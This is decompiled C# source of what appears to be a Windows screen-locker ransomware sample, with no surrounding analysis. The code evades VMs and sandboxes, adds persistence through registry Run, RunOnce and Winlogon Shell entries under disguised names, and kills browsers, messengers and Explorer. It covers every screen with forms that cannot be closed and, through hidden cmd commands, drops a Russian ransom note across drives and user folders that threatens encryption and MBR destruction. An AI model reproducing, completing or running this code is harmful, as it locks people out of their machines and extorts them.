﻿using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ns0
{
	// Token: 0x02000058 RID: 88
	[DesignerGenerated]
	public partial class GForm1 : Form
	{
		// Token: 0x0600039B RID: 923 RVA: 0x0001726C File Offset: 0x0001546C
		public GForm1()
		{
			base.Load += this.GForm1_Load;
			base.FormClosing += this.GForm1_FormClosing;
			this.string_0 = new string[]
			{
				"D",
				"H",
				"Z",
				"Q",
				"W",
				"L",
				"K",
				"J",
				"G",
				"S",
				"I",
				"T",
				"V",
				"W",
				"R",
				"X",
				"P",
				"E",
				"B",
				"M",
				"F"
			};
			this.string_1 = new string[]
			{
				"telegram",
				"discord",
				"skype",
				"zoom",
				"msedge",
				"chrome",
				"opera",
				"browser",
				"firefox",
				"javaw",
				"steam",
				"steamwebhelper",
				"steamservice",
				"EpicGamesLauncher"
			};
			this.string_2 = new string[]
			{
				"AWindowsService.exe",
				"taskhost.exe",
				"windowsx-c.exe",
				"System.exe",
				"_default64.exe",
				"native.exe",
				"ux-cryptor.exe",
				"crypt0rsx.exe"
			};
			this.string_3 = "attrib $h $s $r $i /D ";
			this.string_4 = Environment.ExpandEnvironmentVariables("%temp%\\$unlocker_id.ux-cryptobytes");
			this.object_0 = false;
			this.method_0();
		}

		// Token: 0x0600039D RID: 925 RVA: 0x000174B4 File Offset: 0x000156B4
		private void method_0()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(GForm1));
			base.SuspendLayout();
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.White;
			base.ClientSize = new Size(120, 0);
			base.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			base.MaximizeBox = false;
			base.MinimizeBox = false;
			base.Name = "loader";
			base.ShowIcon = false;
			base.ShowInTaskbar = false;
			base.StartPosition = FormStartPosition.Manual;
			this.Text = "System32";
			base.TransparencyKey = Color.White;
			base.WindowState = FormWindowState.Minimized;
			base.ResumeLayout(false);
		}

		// Token: 0x0600039E RID: 926 RVA: 0x00017588 File Offset: 0x00015788
		private void GForm1_Load(object sender, EventArgs e)
		{
			object[] array = new object[]
			{
				new Class3(),
				new Class4(),
				new Class5()
			};
			bool flag = true;
			bool flag2 = Conversions.ToBoolean(Environment.MachineName.Contains("VPS") || flag == Environment.MachineName.Contains("VDS") || Conversions.ToBoolean(Operators.CompareObjectEqual(flag, NewLateBinding.LateGet(array[0], null, "VM_Detected", new object[0], null, null, null), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(flag, NewLateBinding.LateGet(array[1], null, "AnyRun_Detected", new object[0], null, null, null), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(flag, NewLateBinding.LateGet(array[2], null, "SandBox_Detected", new object[0], null, null, null), false)));
			if (flag2)
			{
			}
			bool flag3 = !Interaction.Command().Contains("debug");
			checked
			{
				if (flag3)
				{
					try
					{
						RegistryKey[] array2 = new RegistryKey[]
						{
							Class1.Class0_0.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true),
							Class1.Class0_0.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true),
							Class1.Class0_0.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true),
							Class1.Class0_0.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", true)
						};
						array2[0].SetValue("WindowsInstaller", "\"" + Application.ExecutablePath + "\" -startup");
						array2[0].SetValue("MSEdgeUpdateX", "\"" + Application.ExecutablePath + "\"");
						array2[1].SetValue("System3264Wow", "\"" + Application.ExecutablePath + "\" --init");
						array2[1].SetValue("OneDrive10293", "\"" + Application.ExecutablePath + "\" /setup");
						array2[1].SetValue("WINDOWS", "\"" + Application.ExecutablePath + "\" --wininit");
						array2[2].SetValue("Shell", "\"" + Application.ExecutablePath + "\"");
						array2[3].SetValue("a", "YOU ARE HACKED!\\1");
						array2[3].SetValue("b", "HAHAHAHAHAHAHA\\1");
						array2[3].SetValue("c", "BIBORAN.com\\1");
						array2[3].SetValue("MRUList", "abc");
					}
					catch (Exception ex)
					{
					}
					string text = Class1.Class0_0.Info.OSFullName.Trim().ToLower();
					Thread[] array3 = new Thread[]
					{
						new Thread(delegate()
						{
							string str = "/S *";
							this.string_3 += str;
						})
					};
					Thread thread = array3[0];
					bool flag4 = true;
					bool flag5 = !text.Contains("10") && flag4 != text.Contains("11");
					if (flag5)
					{
						thread.Start();
					}
					try
					{
						int num = 1;
						do
						{
							RegistryKey registryKey = Class1.Class0_0.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
							registryKey.SetValue("WIN32_" + Conversions.ToString(num), this.string_2[num - 1]);
							num++;
						}
						while (num <= 8);
						try
						{
							bool flag6 = !File.Exists(this.string_4);
							if (flag6)
							{
								File.WriteAllText(this.string_4, DateAndTime.TimeString.Replace(":", null));
							}
						}
						catch (Exception ex2)
						{
							this.object_0 = true;
						}
						int num2 = 0;
						Screen[] allScreens = Screen.AllScreens;
						Screen[] array4 = allScreens;
						foreach (Screen screen in array4)
						{
							num2++;
							bool flag7 = num2 == 1;
							if (flag7)
							{
								GForm2 gform = new GForm2();
								Rectangle workingArea = screen.WorkingArea;
								GForm2 gform2 = gform;
								gform2.Top = workingArea.Top;
								gform2.Left = workingArea.Left;
								gform2.Show();
								gform2.Activate();
							}
							else
							{
								GForm0 gform3 = new GForm0();
								Rectangle workingArea2 = screen.WorkingArea;
								GForm0 gform4 = gform3;
								gform4.Top = workingArea2.Top;
								gform4.Left = workingArea2.Left;
								gform4.Show();
								gform4.Activate();
							}
						}
						this.method_1();
						this.method_2();
						Process[] processes = Process.GetProcesses();
						int num3 = this.string_1.Length - 1;
						for (int j = 0; j <= num3; j++)
						{
							try
							{
								Process[] array6 = processes;
								Process[] array7 = array6;
								foreach (Process process in array7)
								{
									Process process2 = process;
									bool flag8 = process2.ProcessName.ToLower().Contains(this.string_1[j].ToLower());
									if (flag8)
									{
										process2.Kill();
									}
								}
							}
							catch (Exception ex3)
							{
							}
						}
						return;
					}
					catch (Exception ex4)
					{
						return;
					}
				}
				bool flag9 = !File.Exists(this.string_4);
				if (flag9)
				{
					File.WriteAllText(this.string_4, "121212");
				}
				Class1.MyForms_0._o_program.Show();
			}
		}

		// Token: 0x0600039F RID: 927 RVA: 0x00017BA4 File Offset: 0x00015DA4
		public void method_1()
		{
			checked
			{
				try
				{
					string str = this.string_3.Replace("$", "+") + " & echo [%RANDOM%] Упс! Вы подверглись масштабной хакерской атаке и теперь Ваш компьютер заблокирован, а все имеющиеся диски и файлы на них зашифрованы хакерской группировкой.  Любые действия, связанные с попыткой обмануть систему нанесут непоправимый вред Вашему компьютеру и приведут к потере всех важных файлов без возможности восстановления. При попытке снять блокировку MBR ( главный загрузчик материнки) будет снесён и будет подана рекурсивная нагрузка на ваш процессор, что приведёт к его неисправности. У вас есть 48 часов с момента запуска чтобы ввести код 1>info-Locker.txt & attrib -h +s +r info-Locker.txt";
					string[] array = new string[]
					{
						"%userprofile%\\desktop",
						"%systemdrive%\\Users\\Public\\Desktop",
						"%userprofile%\\downloads",
						"%userprofile%\\documents",
						"%userprofile%"
					};
					int num = this.string_0.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						bool flag = Directory.Exists(this.string_0[i] + ":\\");
						if (flag)
						{
							string str2 = this.string_0[i] + ":";
							Interaction.Shell("cmd.exe /c " + str2 + " & " + str, AppWinStyle.Hide, false, -1);
						}
					}
					int num2 = array.Length - 1;
					for (int j = 0; j <= num2; j++)
					{
						Interaction.Shell("cmd.exe /c cd \"" + array[j] + "\"&" + str, AppWinStyle.Hide, false, -1);
					}
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x060003A0 RID: 928 RVA: 0x00017CDC File Offset: 0x00015EDC
		public void method_2()
		{
			try
			{
				Interaction.Shell("taskkill.exe /im Explorer.exe /f", AppWinStyle.Hide, false, -1);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060003A1 RID: 929 RVA: 0x00002BB0 File Offset: 0x00000DB0
		private void GForm1_FormClosing(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
		}

		// Token: 0x060003A2 RID: 930 RVA: 0x00002BBB File Offset: 0x00000DBB
		private void method_3()
		{
			Interaction.MsgBox("0xC00000FD: The memory location at the specified address returned \"null\"", MsgBoxStyle.OkCancel | MsgBoxStyle.Critical, Application.ExecutablePath);
			ProjectData.EndApp();
		}

		// Token: 0x040000B3 RID: 179
		public string[] string_0;

		// Token: 0x040000B4 RID: 180
		public string[] string_1;

		// Token: 0x040000B5 RID: 181
		public string[] string_2;

		// Token: 0x040000B6 RID: 182
		public string string_3;

		// Token: 0x040000B7 RID: 183
		public string string_4;

		// Token: 0x040000B8 RID: 184
		public object object_0;
	}
}
